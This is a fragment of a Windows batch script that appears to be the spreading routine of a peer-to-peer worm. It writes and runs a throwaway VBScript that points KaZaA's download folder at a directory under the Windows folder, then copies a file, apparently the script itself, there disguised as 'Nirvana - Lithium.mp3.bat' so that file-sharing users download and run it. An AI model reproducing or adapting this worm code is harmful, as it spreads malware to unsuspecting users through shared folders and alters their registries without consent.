copy %0 C:\regkey.vbs
echo.on error resume next > C:\regkey.vbs
echo set ws = CreateObject("wscript.shell") >> C:\regkey.vbs
echo ws.regwrite "HKLM\Software\KaZaA\Transfer\DlDir0","%windir%\KaZaA\" >> C:\regkey.vbs
cscript C:\regkey.vbs
del C:\regkey.vbs
md %windir%\KaZaA
copy %MyS% %windir%\KaZaA\Nirvana - Lithium.mp3.bat
